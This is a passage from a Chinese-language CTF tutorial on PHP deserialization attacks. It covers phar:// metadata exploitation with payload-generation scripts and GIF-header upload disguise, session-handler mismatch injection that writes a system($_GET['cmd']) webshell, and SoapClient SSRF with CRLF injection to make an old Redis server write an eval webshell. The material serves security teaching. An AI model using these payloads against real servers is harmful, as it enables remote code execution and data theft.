PHP 在**执行阶段**会自动拼接相邻的字符串常量，但在**源码层面**它们还没有连接：

```php
system('cat /f'.'lag');  // 写的时候 f 和 lag 分开，检测不到 "flag"
                         // 执行时 PHP 拼接为 "cat /flag"
```

---

**三种情况对比：**

| 情况 | 过滤效果 | 长度变化 | 核心利用思路 |
|------|----------|----------|-------------|
| 内容变短 | `str_replace("flag","",$s)` | 声明 > 实际 | 提前把长度声明改小 |
| 内容变长（逃逸）| `str_replace("x","yy",$s)` | 声明 < 实际 | 计算多出字符数，注入属性 |
| 关键字检测 | `stripos($s,"flag")` | 无影响 | 字符串拼接绕过 |

### 1.6.4 PHP > 7.1 属性可见性宽松检测

PHP 在反序列化时，对属性可见性的匹配检测在不同版本中严格程度不同：

- **PHP ≤ 7.1**：反序列化时严格检查属性可见性——`protected` 属性必须在序列化字符串中带有 `\x00*\x00` 标记，`private` 属性必须带有 `\x00类名\x00` 标记，否则无法正确赋值。
- **PHP > 7.1**：反序列化时对属性可见性的检测**放宽**——即使序列化字符串中属性声明为 `public`，如果目标类中同名属性是 `protected` 或 `private`，PHP 仍然会尝试将值写入该属性。

这意味着在 PHP > 7.1 环境下构造 payload 时，你可以**全部使用 public 属性**来简化构造过程，不需要用 `ReflectionClass`，也不需要手动写 `S` 类型加 `\00` 标记。

**实例：**

目标类定义如下：

```php
class VaultC {
    protected $id;
    private $age;
    public $token;
}
```

正常做法需要用 ReflectionClass 或手写 `S` 类型来给 `$id` 和 `$age` 赋值。但在 **PHP > 7.1** 中，可以直接全部声明为 public：

```php
// exp 类定义——全部用 public
class Vault {
    public $name;
    public $id;      // 目标类中是 protected
    public $age;     // 目标类中是 private
    public $token;   // 目标类中是 public
}
```

`unserialize()` 时 PHP 会把 exp 中 public 的 `$id` 值写入目标类 protected 的 `$id` 属性，public 的 `$age` 值写入目标类 private 的 `$age` 属性。

> **注意**：这种宽松检测只在 **PHP > 7.1** 中生效。如果题目环境是 PHP ≤ 7.1，仍然需要按照标准的可见性格式来构造 payload（用 ReflectionClass 或手写 `S` 类型）。

### 1.6.5 非法参数传参

"非法参数传参"在这里特指 PHP 对外部输入参数名的自动处理机制所导致的**参数名无法按预期传递**的问题——参数名本身在传递过程中被 PHP 篡改，需要通过"非法"（非直觉）的方式绕过。

---

#### 1.6.5.1 PHP 对参数名的自动转换

PHP 在构造 `$_GET`、`$_POST`、`$_COOKIE`、`$_REQUEST` 等超全局数组时，会对参数名中的某些字符做自动替换。其中最典型的是：**`.`（点号）和空格会被替换为 `_`（下划线）**。

这意味着：

```text
?data_qc.bz2=xxx    →    $_GET["data_qc_bz2"] = xxx    （点号 → 下划线）
?user name=admin    →    $_GET["user_name"] = admin     （空格 → 下划线）
```

这是 PHP 的一个历史设计决策——注册全局变量时，点号和空格不是合法的变量名字符，所以自动替换。这个机制本身不是漏洞，但会给 CTF 出题人提供一个天然的"隐藏入口"。

---

#### 1.6.5.2 场景

```php
$payload = $_GET["data_qc.bz2"];
if (isset($payload)) {
    unserialize($payload);
} else {
    echo "上传类型不对哦";
}
```

题目反序列化入口位于 `$_GET["data_qc.bz2"]`——参数名中带有一个 `.`。

如果攻击者按直觉访问：

```
?data_qc.bz2=<payload>
```

PHP 会将参数名中的 `.` 自动替换为 `_`，实际写入的是 `$_GET["data_qc_bz2"]`。代码中的 `$_GET["data_qc.bz2"]`（带点号）始终为 `null`，于是页面永远返回"上传类型不对哦"。

---

#### 1.6.5.3 绕过方式：`[` → `_` 替换

PHP 的 `.` → `_` 转换**只作用于参数名的"顶层"部分**。当 PHP 在参数名中遇到 `[` 时，`[` 之后的内容被视为数组键名——数组键名中 `.` 是合法的，不会被替换。

但 `[` 本身也是一个非法变量名字符，**同样会被替换为 `_`**。因此：

```
?data[qc.bz2=<payload>
```

PHP 解析流程：
1. 参数名 `data[qc.bz2` 中，`[` 被替换为 `_` → `data_qc.bz2`
2. `.bz2` 位于 `[` 之后，处于数组键名区域，点号被保留
3. 最终 `$_GET["data_qc.bz2"]` 接收到值

对比：

| 传参方式 | PHP 解析后的 `$_GET` | `$_GET["data_qc.bz2"]` 能否取到 |
|----------|---------------------|:---:|
| `?data_qc.bz2=xxx` | `$_GET["data_qc_bz2"] = "xxx"` | 否 |
| `?data[qc.bz2=xxx` | `$_GET["data_qc.bz2"] = "xxx"` | 是 |

---

#### 1.6.5.4 其他相关的情况

PHP 参数名自动转换不只影响 `.`。同类的"非法参数"场景包括：

| 参数名中的字符 | PHP 行为 | 绕过思路 |
|:---:|---|---|
| `.`（点号） | 替换为 `_` | 在点号前插入 `[` 保护点号 |
| ` `（空格） | 替换为 `_` | 一般不需要绕过，但会让参数名变长 |
| `[`（左方括号） | 有匹配 `]` 时开启数组解析；无匹配 `]` 时替换为 `_` | 两种行为都可利用 |
| `.` 出现在 `$_POST` | 同 `$_GET`，也会被替换 | 绕过方式一致 |
| `.` 出现在 `$_COOKIE` | PHP < 8.0 也会替换，≥ 8.0 不再替换 | 版本差异，出题时可利用 |

**CTF 中的实际意义：**

- 出题方故意将反序列化入口放在带点号的参数名中，作为天然的"门槛"——不知道 PHP 这一特性的选手会被挡在门外，连 payload 都传不进去。
- 解题方需要意识到：看到 `$_GET["xxx.yyy"]` 时，URL 中不能直接写 `?xxx.yyy=...`，必须插入 `[` 来保护点号。
- 这种设计在 CTF 中并不罕见——它不涉及任何代码漏洞，纯粹是 PHP 语言特性的"知识壁垒"。

### 1.6.6 phar:// 反序列化

`phar://` 是反序列化漏洞中的历史重要攻击面，但必须先看 PHP 版本：PHP 7 及之前，打开恶意 PHAR 的文件操作可能隐式反序列化 metadata；PHP 8 起这一副作用已经移除，普通 `file_exists()`、`fopen()` 等操作不会再自动反序列化 metadata。

---

###### 什么是 PHAR

PHAR（PHP Archive）类似于 Java 的 JAR——把多个 PHP 文件打包成一个 `.phar` 文件，方便分发和部署。

一个 PHAR 文件由四部分组成：

| 部分 | 说明 |
|------|------|
| **Stub** | 文件头，一段 PHP 代码（通常以 `__HALT_COMPILER();` 结尾），标识"这是一个 PHAR 文件" |
| **Manifest** | 元数据区，记录打包了哪些文件、文件的属性、以及**用户自定义的元数据（metadata）** |
| **File Contents** | 实际打包的文件内容 |
| **Signature** | 文件签名（默认 SHA1），用于校验文件完整性 |

**metadata 是整个攻击的入口。** 生成 PHAR 时，可以通过 `$phar->setMetadata($obj)` 将序列化对象存入 manifest。PHP 7 及之前打开归档时会反序列化它；PHP 8 起只有显式调用 `Phar::getMetadata()` / `PharFileInfo::getMetadata()` 才会反序列化相应 metadata，并可传入 `allowed_classes` 等限制选项。

---

###### 为什么 phar:// 会触发反序列化

这是 PHP 内部的实现机制，不是漏洞，而是特性：

1. 你生成 PHAR 时：`$phar->setMetadata($obj)` → PHP 内部调用 `serialize($obj)`，把结果存入 manifest。
2. PHP 7 及之前，服务器通过 `phar://` 打开文件 → PHP 读取 manifest → 自动反序列化 metadata。
3. PHP 8 起，普通 Stream Wrapper 操作只读取归档结构；只有应用显式获取 metadata 时才发生反序列化。

**关键结论：** "源码没有 `unserialize()`，文件函数也能触发"的经典链只适用于 PHP 7 及之前。PHP 8 目标需要继续寻找显式 `getMetadata()`、其他反序列化入口或第三方库自己的危险处理。

---

###### 触发条件

- PHP 开启 `phar` 扩展（默认开启，`--disable-phar` 才会关闭）。
- PHP 7 及之前：代码中有真正打开攻击者 PHAR 的、接受 `phar://` 的文件操作（见下方列表）。
- PHP 8 起：需要代码显式调用 `Phar::getMetadata()` / `PharFileInfo::getMetadata()`，普通文件函数不足以触发对象反序列化。
- **读取 phar 不需要关闭 `phar.readonly`。** `phar.readonly` 只控制**写入** phar 文件（即生成/修改 phar），读取归档不受此限制。所以你在本地需要 `phar.readonly=0` 来**生成** phar，但服务器读取时不需要修改该配置；metadata 是否反序列化仍按 PHP 版本和调用方式判断。
- 触发 phar 反序列化也不需要 phar 文件后缀为 `.phar`——PHP 通过文件**内容**识别 phar 格式，不依赖后缀名。

---

###### 完整利用流程

**Step 1：分析目标代码，找到 POP 链**

和普通反序列化一样，你需要先在目标代码中找可用的魔术方法链。假设目标有一个类：

```php
class FileReader {
    public $filename;
    public function __destruct() {
        echo file_get_contents($this->filename);
    }
}
```

**Step 2：生成恶意 phar 文件**

生成脚本 `gen.php`：

```php
<?php
// ① 声明与目标同名并包含所需属性的类，以便生成正确序列化数据
//    方法实现不会被 serialize() 写入；服务器端必须能加载目标类和对应 POP 链
class FileReader {
    public $filename = "/flag";  // 预设攻击目标：读取 /flag
}

// ② 删除旧文件（如果上次生成失败或残留）
//    @ 是 PHP 的错误抑制符——如果文件不存在，不报 Warning
@unlink("payload.phar");

// ③ 创建或打开 payload.phar 对应的 Phar 对象
//    文件何时出现在磁盘上属于实现和缓冲细节，不应依赖；只需保证最终
//    stopBuffering() 成功并检查生成结果
$phar = new Phar("payload.phar");

// ④ startBuffering() 开始缓冲模式
//    后面所有的 addFromString、setMetadata、setStub 都暂存在内存中
//    最后 stopBuffering() 时一次性组装并写入磁盘
//    注意：缓冲区内各步骤的先后顺序无关紧要——stopBuffering() 会按照
//    PHAR 规范自动排列 Stub → Manifest → Contents → Signature 四部分
$phar->startBuffering();

// ⑤ 设置 Stub（文件头）
//    可执行 PHAR 的 Stub 必须包含有效的 __HALT_COMPILER(); 终止标记
//    PHP 解析器看到该标记后停止把后续归档数据当 PHP 源码解析
$phar->setStub("<?php __HALT_COMPILER(); ?>");

// ⑥ addFromString() 向 phar 中添加一个"虚拟文件"
//    参数1: 文件在 phar 内部的路径（"test.txt"）
//    参数2: 文件内容（这里随便写，只要能构成合法文件）
//    添加一个归档成员，便于通过 phar://.../test.txt 实际打开该成员
$phar->addFromString("test.txt", "nothing");

// ⑦ 创建恶意对象
$obj = new FileReader();
$obj->filename = "/flag";  // 对象销毁时，__destruct() 会读取这个路径

// ⑧ setMetadata() —— 整段代码的核心
//    把 $obj 存入 PHAR 的 manifest 元数据区
//    PHP 内部会自动对 $obj 调用 serialize()，结果写入 manifest
//    PHP 7 及之前通过 phar:// 打开文件时会自动反序列化 metadata
//    PHP 8 起普通文件操作不会自动反序列化，需显式 getMetadata()
$phar->setMetadata($obj);

// ⑨ stopBuffering() 停止缓冲，把缓冲中的内容写入磁盘
//    此时 payload.phar 正式生成，包含：
//    - Stub:        <?php __HALT_COMPILER(); ?>
//    - Manifest:    记录了 test.txt 和 metadata（FileReader 对象的序列化数据）
//    - Contents:    test.txt 的内容（"nothing"）
//    - Signature:   默认 SHA1 签名
$phar->stopBuffering();
```

**执行生成：**

```bash
# -d phar.readonly=0：临时关闭 phar.readonly（默认值为 1，禁止写入 phar 文件）
# 这个参数只在本地生成时需要，服务器读取 phar 不受此限制
php -d phar.readonly=0 gen.php
```

执行后目录下出现 `payload.phar`。可以用 hexdump 或文本编辑器打开看看内部结构——你会看到熟悉的序列化字符串嵌在 manifest 区域中。

**Step 3：上传 phar 文件**

将 `payload.phar` 上传到服务器。如果上传接口限制后缀名（比如只允许图片），直接把文件改名为 `payload.png`、`payload.gif` 再上传——phar 格式通过文件头识别，与后缀无关。

**Step 4：触发 phar:// 协议**

假设上传路径为 `/var/www/html/uploads/payload.png`，服务器代码中有：

```php
// 服务器代码——完全看不到 unserialize()
$filename = $_GET['file'];
file_exists($filename);  // 看似无害的文件检测
```

攻击：

```text
?file=phar:///var/www/html/uploads/payload.png/test.txt
```

在 PHP 7 及之前：`file_exists("phar://.../test.txt")` → PHP 打开 PHAR 成员 → 反序列化 metadata → `FileReader` 对象复活 → 正常销毁时 `__destruct()` 读取 `/flag`。PHP 8 中这条 `file_exists()` 链不会自动反序列化 metadata。

**"服务器代码没有 `unserialize()`"是这条旧版利用链的特点，不适用于 PHP 8 的默认行为。**

---

###### 后缀绕过与文件类型检测绕过

**后缀绕过（简单）：** PHAR 格式由文件头 `__HALT_COMPILER();` 标识，不依赖后缀。上传 `payload.phar` 被拦截，改成 `payload.png` 即可。大部分上传接口只检查后缀，改名即绕过。

**文件类型检测绕过（进阶）：** 有些上传接口不仅检查后缀，还检查文件内容（如 `getimagesize()`、文件头魔数）。此时可以在 phar 前面拼接合法的图片文件头：

```php
<?php
class FileReader {
    public $filename = "/flag";
}

@unlink("payload.phar");
$phar = new Phar("payload.phar");
$phar->startBuffering();

// Stub 前拼接 GIF 文件头——GIF89a 是合法的 GIF 图片开头
$phar->setStub("GIF89a<?php __HALT_COMPILER(); ?>");

$phar->addFromString("test.txt", "nothing");
$obj = new FileReader();
$obj->filename = "/flag";
$phar->setMetadata($obj);
$phar->stopBuffering();

// Phar 构造器创建归档时通常要求受支持的扩展名，生成后再改名上传
unset($phar);
rename("payload.phar", "payload.png");
```

生成的 `payload.png`：
- 文件头是 `GIF89a`，`getimagesize()` 会认为它是合法的 GIF 图片（绕过内容检测）
- 后缀是 `.png`（是否绕过取决于上传白名单和后续检测）
- 内部包含完整的 phar 结构，`phar://` 协议仍然可以识别并解析

**压缩变体（特殊场景）：** PHAR 支持内部成员压缩和整包压缩，但能否绕过检测取决于扫描器是否会识别/解压归档，不能写成"压缩后攻击不受影响"。目标还必须具备相应的 zlib/bzip2 支持。

两种压缩方式：

**方式一：内部文件压缩（`compressFiles`）**

压缩 phar 内部存放的文件内容（即 `addFromString()` 添加的文件的**数据部分**）：

在生成脚本中的位置——**放在 `stopBuffering()` 之后**（phar 需要先写入磁盘，再对已生成的 phar 文件执行压缩）：

```php
// ...前面是 addFromString、setMetadata 等...
$phar->stopBuffering();              // 先写入磁盘
$phar->compressFiles(Phar::GZ);      // 再压缩内部文件数据
// 只压缩归档成员的数据；metadata 仍在 manifest 中
```

执行后只有归档成员的数据被 gzip 压缩，metadata、Stub 和 manifest 的关键结构仍然存在，因此这不是"整体字节流隐藏"，也不是可靠的 WAF 绕过。旧版 PHP 的 metadata 行为仍按 PHP 版本判断。

**方式二：整个 phar 文件压缩（`.gz` / `.bz2`）**

优先使用 Phar API 生成结构有效的整包压缩归档：

```php
// 需要相应压缩扩展；通常生成 payload.phar.gz
$compressed = $phar->compress(Phar::GZ);
```

在安装相应压缩扩展并生成有效压缩 PHAR 的环境中，phar 流包装器可以读取 `.phar.gz` / `.phar.bz2`：

```text
phar:///var/www/html/uploads/payload.phar.gz
```

整包压缩会改变磁盘字节特征，但成熟扫描器可以解压检查；目标 PHP 是否能读取、上传链是否保留文件、以及 metadata 是否会反序列化仍需分别验证。

---

###### 签名格式修改

**PHAR 签名的位置和作用：**

回顾 PHAR 的四部分结构：Stub → Manifest → Contents → **Signature**。签名位于文件的最末尾，是 PHP 在生成 PHAR 时对整个文件内容计算的哈希值，用来校验文件是否被篡改。

签名格式由 `setSignatureAlgorithm()` 设置，**放在 `stopBuffering()` 之前**：

```php
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$phar->addFromString("test.txt", "nothing");
$phar->setMetadata($obj);
$phar->setSignatureAlgorithm(Phar::SHA256);  // 必须在 stopBuffering 之前设置
$phar->stopBuffering();
```

可选算法：

| 常量 | 说明 |
|------|------|
| `Phar::SHA1` | 默认，SHA-1 哈希 |
| `Phar::SHA256` | SHA-256 哈希 |
| `Phar::SHA512` | SHA-512 哈希 |
| `Phar::MD5` | MD5 哈希 |

**为什么要改签名格式？**

1. **改变签名类型特征** —— 如果题目明确只检查某种签名类型，换成受支持算法会改变文件尾部；它不会隐藏 Stub、Manifest 等其他 PHAR 结构。
2. **调整文件大小** —— 不同签名长度不同（SHA-1 是 20 字节，SHA-256 是 32 字节，SHA-512 是 64 字节，MD5 是 16 字节），有时微调文件大小可以绕过特定限制。
3. **适配题目对文件大小或签名算法的特定检查** —— 仍需保持整个 PHAR 签名有效。

---

**不要在已签名 PHAR 尾部任意追加数据：**

PHAR 的签名区位于文件末尾，最后包含签名类型和 `GBMB` 标记。直接执行 `echo ... >> payload.phar` 会把额外数据放到签名尾标之后，使签名布局或校验失效，不能当作通用绕过。需要调整内容或大小时，应在生成归档前修改 Stub/成员内容，再让 Phar API 重新计算有效签名。

---

###### 可触发 phar 反序列化的函数

下面函数中能接受 `phar://` 并实际打开归档的调用，在 PHP 7 及之前可能触发 metadata 反序列化；不同函数、参数位置和 PHP 版本仍需实测。PHP 8 起普通文件操作不再因此自动反序列化：

**文件读写类：**
`file_get_contents`、`file_put_contents`、`fopen`、`file`、`readfile`

`fread`、`fgets`、`fgetcsv`、`fpassthru` 接收的是已经打开的资源，不是路径；如果链路有触发点，发生在前面的 `fopen("phar://...")`，不能把这些资源读取函数本身列为路径触发器。

**文件检测类：**
`file_exists`、`is_file`、`is_dir`、`filemtime`、`filesize`、`filetype`、`stat`、`lstat`、`fileatime`、`filectime`、`filegroup`、`fileinode`、`fileowner`、`fileperms`

**文件包含类：**
`include`、`include_once`、`require`、`require_once`

**图像处理类：**
`getimagesize`、`exif_thumbnail`、`exif_imagetype`

**文件操作类：**
`copy`、`rename`、`unlink`、`mkdir`、`rmdir`、`touch`、`move_uploaded_file`

> 一句话判断：先确认 PHP 版本，再确认该参数是否真的接受并打开 `phar://`。PHP 7 及之前才适用经典隐式 metadata 反序列化；PHP 8 起应寻找显式 `getMetadata()`。

## 1.7 PHP 会话反序列化

PHP 的 Session 机制在存储和读取 session 数据时会进行序列化和反序列化操作。当不同的处理器配置不一致时，就可能导致 session 反序列化漏洞。

### 1.7.1 `session.serialize_handler` 的三种处理器

PHP 提供了三种 session 序列化处理器，由 `session.serialize_handler` 配置决定：

| 处理器 | 存储格式 | 说明 |
| ---------------- | -------------------------------- | ---------------------------------------- |
| `php` | `键名\|序列化后的值` | 默认处理器，竖线分隔 |
| `php_serialize` | `a:1:{s:键名长度:"键名";序列化值;}`| 使用标准的 `serialize()` 格式序列化整个数组 |
| `php_binary` | `键名长度(1字节)键名序列化值` | 二进制长度前缀，较少见 |

**示例 —— 同一个 Session 数据在不同处理器下的存储：**

```php
// session 数据：$_SESSION['user'] = 'admin';

// php 处理器存储：
// user|s:5:"admin";

// php_serialize 处理器存储：
// a:1:{s:4:"user";s:5:"admin";}

// php_binary 处理器存储：
// \x04users:5:"admin";
```

### 1.7.2 处理器差异攻击原理

当**写入 session** 和**读取 session** 使用不同的处理器时，攻击者可以利用格式差异注入恶意的序列化数据。

**典型场景：**

- PHP 全局 `session.serialize_handler` 设置为 `php_serialize`。
- 某个特定页面用 `ini_set('session.serialize_handler', 'php')` 改为 `php` 处理器来读取 session。
- 攻击者可以控制部分 session 数据（例如通过注册时的用户名）。

**攻击原理：**

1. **写入阶段（`php_serialize`）：** 攻击者提交的 session 数据统一用 `serialize()` 格式存储。
2. **读取阶段（`php`）：** 解析时遇到 `|`，`|` 之前被视为键名，`|` 之后被视为序列化值，PHP **自动调用 `unserialize()`**——开发者只写了 `session_start()`，反序列化是 PHP 内部机制自动完成的，不需要代码中显式出现 `unserialize()`。这一点和 phar:// 反序列化原理相同。

如果攻击者在 session 数据中插入 `|`，那么 `|` 之后的部分就会被 `php` 处理器当作序列化对象来反序列化——攻击者成功注入了一个"凭空出现"的反序列化入口。

### 1.7.3 利用示例

**假设环境：**

```php
// index.php — 全局使用 php_serialize
session_start();                               // ① 开启/恢复会话
$_SESSION['username'] = $_POST['username'];    // 攻击者可控

// profile.php — 使用 php 处理器
ini_set('session.serialize_handler', 'php');
session_start();                               // ② 以 php 处理器恢复会话
// 此时 $_SESSION['username'] 已被反序列化还原
```

> **`session_start()` 做了什么？**
>
> 1. 检查客户端发来的 Cookie 中是否有 `PHPSESSID`。
> 2. 如果有，去服务器存储（默认文件 `/tmp/sess_<PHPSESSID>`）中读取对应的 session 数据。
> 3. 调用当前 `session.serialize_handler` 配置的解析器，**自动反序列化** session 数据，填充到 `$_SESSION` 超全局数组中。
> 4. 如果没有找到对应 session，创建一个新的空 session。
>
> 简单说：`session_start()` = 从磁盘读取 session 文件 → 自动反序列化 → 变成 `$_SESSION` 数组供你读写。反序列化是它内部自动完成的，代码中看不到 `unserialize()`。**这就是为什么 session 处理器配置不一致时会出漏洞——同一个 session 文件用不同的反序列化规则去解析。**
>
> **反序列化后 `$_SESSION` 里是什么？**
>
> 举个例子。假设 session 文件中存储的内容是：
>
> ```
> username|s:5:"admin";
> ```
>
> `php` 处理器读到这行，在 `|` 处切分：
> - 键名：`username`
> - 值：`s:5:"admin";` → `unserialize()` → 字符串 `"admin"`
>
> 最终 `$_SESSION` 就是：
>
> ```php
> ['username' => 'admin']
> ```
>
> 但如果攻击者把值换成一个**序列化对象**，比如：
>
> ```
> username|O:6:"Logger":2:{s:7:"logfile";s:5:"/flag";s:7:"message";s:4:"test";}
> ```
>
> 那么 `unserialize()` 还原出来的就是一个**活的 `Logger` 对象**：
>
> ```php
> $_SESSION['username'] = Logger对象 {
>     logfile => "/flag",
>     message => "test"
> }
> ```
>
> 对象被还原后，在脚本结束或 `unset()` 时 `__destruct()` 触发——攻击链条就接上了。**Session 反序列化本质上就是在 `$_SESSION` 数组里复活了一个恶意对象。**

**还有一个可利用的类：**

```php
class Logger {
    public $logfile;
    public $message;

    public function __destruct() {
        file_put_contents($this->logfile, $this->message, FILE_APPEND);
    }
}
```

**攻击步骤：**

1. 攻击者在注册/登录时提交用户名：

```text
|O:6:"Logger":2:{s:7:"logfile";s:9:"shell.php";s:7:"message";s:29:"<?php system($_GET['cmd']);?>";}
```

2. `php_serialize` 处理器将其序列化为：

```text
a:1:{s:8:"username";s:99:"|O:6:"Logger":2:{s:7:"logfile";s:9:"shell.php";s:7:"message";s:29:"<?php system($_GET['cmd']);?>";}";}
```

3. 当 `profile.php` 使用 `php` 处理器读取时：
   - `|` 之前被视为键名（空或任意内容）被忽略。
   - `|` 之后的部分 `O:6:"Logger":2:{...}` 被传入 `unserialize()`。
   - 反序列化创建 `Logger` 对象 → 脚本结束时触发 `__destruct()` → 写入 webshell。

4. 访问 `shell.php?cmd=cat /flag` 即可拿到 flag。

**防御方式：**

- 确保整个应用中 `session.serialize_handler` 配置一致。
- 不要将用户输入直接写入 session 后再在不同处理器下读取。

## 1.8 PHP 原生类利用

### 1.8.1 什么是 PHP 原生类

PHP 原生类（Built-in Classes）指 PHP 内核或标准扩展自带的类，无需定义即可直接 `new`。在反序列化中，原生类的价值在于：**当题目自定义类中找不到可用的魔术方法链时，可以"借用"原生类自带的行为来补上链条缺口。**

但原生类不等于都能塞进序列化字符串。在常见的现代 PHP 环境中，`SplFileObject`、`GlobIterator`、`DirectoryIterator`、`SimpleXMLElement` 等内部对象直接交给 `serialize()` 会被拒绝；历史版本存在个别内部类例外，不能类推。可利用场景通常是题目对象先反序列化出可控的路径、模式或 XML 字符串，再由目标代码构造这些原生对象。每条链都要按目标 PHP 版本和已安装扩展实测。

典型场景：题目只有一个简单的自定义类、没有 `__destruct()`、没有 `__toString()`——看起来没有利用点。但如果你能触发一个不存在的方法调用，引入 `SoapClient::__call()` 就能发起 SSRF；或者你需要一个能 `echo` 出来的对象，引入 `Error::__toString()` 就能输出内容。

常见可利用的原生类：

| 原生类 | 主要用途 | 触发机制 |
|--------|----------|----------|
| `SoapClient` | SSRF / CRLF 注入 | `__call()` 自动构造 HTTP 请求 |
| `GlobIterator` | 目录遍历 | 目标代码用可控 glob 模式构造后遍历 |
| `SplFileObject` | 文件读取 | 目标代码用可控路径构造后逐行读取 |
| `DirectoryIterator` | 目录遍历 | 目标代码用可控目录构造后遍历 |
| `SimpleXMLElement` | XML 解析；特定旧配置下可能 XXE | 目标代码用可控 XML 和解析选项构造 |
| `Error` / `Exception` | 绕过类型检测 / 充当 `__toString()` | 构造函数接受字符串，`__toString()` 输出错误信息 |

---

### 1.8.2 SoapClient —— SSRF + CRLF 注入

`SoapClient` 属于 PHP 的 SOAP 扩展，只有目标安装并启用该扩展时才能使用；其可序列化属性、请求头生成方式和 CRLF 表现也应按目标 PHP 版本实测。

**关键方法：**

- `__construct(?string $wsdl, array $options = [])` — $wsdl 可为 null（非 WSDL 模式），$options 中 `location` 决定请求发向哪里
- `__call(string $name, array $args): mixed` — 调用不存在的方法时触发，用 $name 构造 SOAP Action，向 `location` 发起 POST 请求

`SoapClient` 不是 `final` 类，可以被继承并重写 `__doRequest()`；本节利用不需要继承，只把它作为其他对象的属性值，在 POP 链中触发 `__call()`。

---

**触发机制：**

当代码调用 `SoapClient` 对象上**不存在的非静态方法**时，`__call()` 被触发，内部向构造函数中指定的 `location` 地址发起一个 SOAP 格式的 POST 请求。

**核心参数：**

```php
$client = new SoapClient(null, [
    'location'   => 'http://目标地址:端口/',   // 请求发到这里 —— SSRF 的核心
    'uri'        => 'http://命名空间/',        // SOAP 命名空间，必填但值不重要
    'user_agent' => '自定义User-Agent',        // 可注入 CRLF（见下方）
]);
```

- `location` — SSRF 的目标。`__call()` 被触发时，HTTP 请求就发到这里。可以是内网 IP、任意端口。
- `uri` — SOAP 协议的命名空间标识（见下方解释）。
- `user_agent` — 发出的 HTTP 请求中的 User-Agent 头。因为可以包含 `\r\n`（见下文 CRLF 注入），实际上能控制的不止是 User-Agent。

**关于 `uri` 参数：**

SOAP 协议要求每个服务有一个命名空间 URI 来标识自己，它会出现在 SOAP 封套的 `xmlns` 里：

```xml
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"
                   xmlns:ns1="http://命名空间/">
  <SOAP-ENV:Body>
    <ns1:someMethod/>
  </SOAP-ENV:Body>
</SOAP-ENV:Envelope>
```

正常 SOAP 场景下这个 URI 用于区分不同服务的同名方法。但在 SSRF 利用中我们根本不关心 SOAP 协议本身——只是利用 SoapClient 发 HTTP 请求。`uri` 之所以必须填，是因为 PHP 在**非 WSDL 模式**下强制要求这个参数，否则构造就报错。填什么无所谓，`"xxx"` 也行。

---

**POP 链中如何触发：**

需要一个"跳板"——自定义类把方法调用导向 `SoapClient` 的不存在方法：

```php
class JumpBoard {
    public $obj;

    public function __destruct() {
        // ① 反序列化后对象销毁，__destruct() 自动触发
        // ② $this->obj->anyMethod() —— anyMethod 在 SoapClient 上不存在
        // ③ 触发 SoapClient::__call('anyMethod', [])
        // ④ __call() 内部向 location 发起 POST 请求
        $this->obj->anyMethod();
    }
}

// 构造 payload
$board = new JumpBoard();
$board->obj = new SoapClient(null, [
    'location' => 'http://127.0.0.1:6379/',  // SSRF 目标：内网 Redis
    'uri'      => 'xxx',
]);
echo urlencode(serialize($board));
```

---

**CRLF 注入原理：**

HTTP 协议中，`\r\n`（CR + LF，即回车换行）是分隔请求行、头部和正文的控制字符。部分 PHP/SOAP 版本会把 `user_agent` 原样拼进 `User-Agent` 头部；若换行没有被拒绝或清洗，就可能提前终止该行并注入额外头部。是否成立必须抓包验证，不能只凭属性可控就下结论。

正常 SoapClient 发出的 HTTP 请求：

```
POST / HTTP/1.1
Host: 127.0.0.1:6379
User-Agent: PHP-SOAP/7.0
Content-Type: text/xml; charset=utf-8
Content-Length: xxx

<?xml version="1.0"?>...
```

如果将 `user_agent` 设置为 `a\r\nSET mykey myvalue\r\n`：

```
POST / HTTP/1.1          ← SoapClient 自动生成
Host: 127.0.0.1:6379      ← SoapClient 自动生成
User-Agent: a             ← user_agent 的第一部分（"a"）正常出现在头部
SET mykey myvalue         ← \r\n 后的内容成为新的"伪头部行"（实际是注入的命令）
                          ← 尾部的 \r\n 产生空行
Content-Type: text/xml... ← SoapClient 继续生成的头部（对 Redis 来说是无效命令）
Content-Length: xxx

<?xml version="1.0"?>...  ← SoapClient 生成的 XML 正文（对 Redis 来说是无效命令）
```

每个 `\r\n` 的作用：
- 第一个 `\r\n`（`a` 之后）：结束 `User-Agent` 行，后续内容脱离头部区域
- 第二个 `\r\n`（`SET...` 之后）：产生一个空行，将注入内容和 SoapClient 后续生成的头部隔开

这类"让 Redis 忽略 HTTP 行、继续执行后续命令"的描述只适用于未修复跨协议攻击的旧 Redis。Redis 3.2.7 起会在看到 `POST` 或 `Host:` 时把它识别为跨协议攻击并中止连接，因此现代 Redis 上后面的 `SET` 不会执行。即使是旧版本，还要同时满足无认证/认证可绕过、命令未被禁用、目标目录可写等条件。

---

**历史环境例题：SoapClient 打旧版内网 Redis 写 Webshell**

题目代码 `index.php`：

```php
<?php
class Safer {
    public $checker;
    public function __destruct() {
        $this->checker->verify();  // verify() 在 SoapClient 上不存在 → __call()
    }
}
$obj = unserialize($_GET['data']);
```

假设内网 `127.0.0.1:6379` 运行的是未修复该跨协议问题的 Redis（早于 3.2.7），未设密码，允许修改持久化目录且 Web 目录可写。该前提不适用于现代默认配置。

**Exp（逐行解释）：**

```php
<?php
// ① 定义和题目同名的类 —— 属性名必须一致
class Safer {
    public $checker;
}

// ② 构造 Redis 命令序列，每条命令用 \r\n 分隔
//    \r\n 使用双引号字符串，确保被解析为真正的回车换行
$redis_cmd = "\r\n" .
    "CONFIG SET dir /var/www/html\r\n" .       // Redis：设置持久化目录为 web 根目录
    "CONFIG SET dbfilename shell.php\r\n" .     // Redis：设置持久化文件名为 shell.php
    'SET shell "<?php eval($_POST[1]);?>"' .    // PHP 单引号字符串不会插值 $，无需写成 \$_POST
    "\r\n" .
    "SAVE\r\n";                                  // Redis：执行持久化，将数据写入 shell.php

// ③ 创建跳板对象
$obj = new Safer();

// ④ 创建 SoapClient，注入恶意命令
$obj->checker = new SoapClient(null, [
    'location'   => 'http://127.0.0.1:6379/',  // SSRF 目标：内网 Redis
    'uri'        => 'x',                         // 必填但值无所谓
    'user_agent' => "a" . $redis_cmd,            // "a" 后面拼接 \r\n + Redis 命令
]);

// ⑤ 输出 URL 编码后的 payload
echo urlencode(serialize($obj));
```

**逐行说明：**

- **①**：exp 中的类名必须和题目代码中的类名一致（`Safer`）。属性名也必须一致（`$checker`），否则反序列化后值对不上。
